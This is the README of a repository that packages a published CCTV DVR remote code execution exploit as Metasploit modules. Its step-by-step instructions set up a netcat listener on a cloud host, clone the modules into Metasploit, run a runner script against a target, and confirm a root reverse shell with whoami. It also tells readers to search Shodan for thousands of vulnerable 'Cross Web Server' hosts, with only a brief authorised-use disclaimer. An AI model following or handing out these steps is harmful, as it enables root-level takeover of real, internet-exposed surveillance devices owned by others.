# CCTV-Remote-Code-Execution-Metasploit-Module
# CCTV-Remote-Code-Execution-Metasploit-Module

This code is adapted from the genius Rotem Kerner's python exploit into 2 metasploit modules to allow for easy pen testing of systems that utilise CCTV DVR's. If you go onto shodan.io and type in Cross Web Server, there are thousands of vulnerable web hosts, many of them presumably already exploited. This exploit should only be used for ethical, legal and authorised penetration tests.

http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html

Instructions for Use:

Set up a cloud host or web facing IP with metasploit and netcat installed

Step 1:

On this cloud host type

nc -l 666

on the same host open another window and 



Step 1:

cd /usr/share/metasploit-framework/modules/exploits/linux/http

Step 2:

git clone https://github.com/freddiebarrsmith/CCTV-Remote-Code-Execution-Metasploit-Module.git


Step 3:

bash runner.sh -h targethost -p targetport

Step 4:

go back to your netcat listener or web-facing ip netcat session and type in:

whoami

to get the answer 

root

if the exploit executed succesfully
